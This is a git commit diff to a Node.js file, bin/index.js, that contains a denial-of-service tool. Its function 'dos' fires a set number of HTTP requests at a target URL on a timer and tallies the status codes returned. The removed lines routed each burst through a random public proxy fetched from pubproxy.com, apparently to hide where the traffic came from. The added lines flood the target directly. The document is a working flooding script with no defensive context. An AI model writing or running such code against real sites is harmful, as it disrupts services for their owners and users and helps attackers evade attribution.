906d6032d3b514b40d82c0850de8fc486e60a9ea
berlovesumwah <166808321+weberbers201938@users.noreply.github.com>
2024-05-22 00:16:01 +0800

    Update index.js

--- bin/index.js
+++ bin/index.js
@@ -1,45 +1,34 @@
-const request = require('request');
-const proxyUrl = 'http://pubproxy.com/api/proxy?format=json';
+const req = require('request');
 
-const dos = (targetUrl, qty, ms) => {
+const dos = (url, qty, ms) => {
     let err = 0, ok = 0;
     let counter = 1;
     let statusCodes = {};
 
     setInterval(() => {
-        request(proxyUrl, (error, response, body) => {
-            if (!error && response.statusCode == 200) {
-                const proxyData = JSON.parse(body).data[0];
-                const proxyUrl = `http://${proxyData.ipPort}`;
-                const requestOptions = {
-                    url: targetUrl,
-                    proxy: proxyUrl
-                };
 
-                for (let i = 0; i < qty; i++) {
-                    request(requestOptions, (error, response) => {
-                        if (error) {
-                            err++;
-                        } else {
-                            ok++;
-                            const statusCode = response.statusCode;
-                            
-                            if (statusCodes[statusCode]) {
-                                statusCodes[statusCode]++;
-                            } else {
-                                statusCodes[statusCode] = 1;
-                            }
-                        }
-                    });
+        for (let i = 0; i < qty; i++) {
+            req(url, (error, response) => {
+                if (error) {
+                    err++;
+                } else {
+                    ok++;
+                    const statusCode = response.statusCode;
+                    
+                    if (statusCodes[statusCode]) {
+                        statusCodes[statusCode]++;
+                    } else {
+                        statusCodes[statusCode] = 1;
+                    }
                 }
-            }
-        });
+            });
+        }
 
         const statusCodesString = Object.entries(statusCodes)
             .map(([code, count]) => `${code}: ${count}`)
             .join(', ');
 
-        console.log(`${counter}: ${targetUrl} ${ok} ${err} Status Codes: ${statusCodesString}`);
+        console.log(`${counter}: ${url} ${ok} ${err} Status Codes: ${statusCodesString}`);
         
         counter++;
         err = ok = 0;
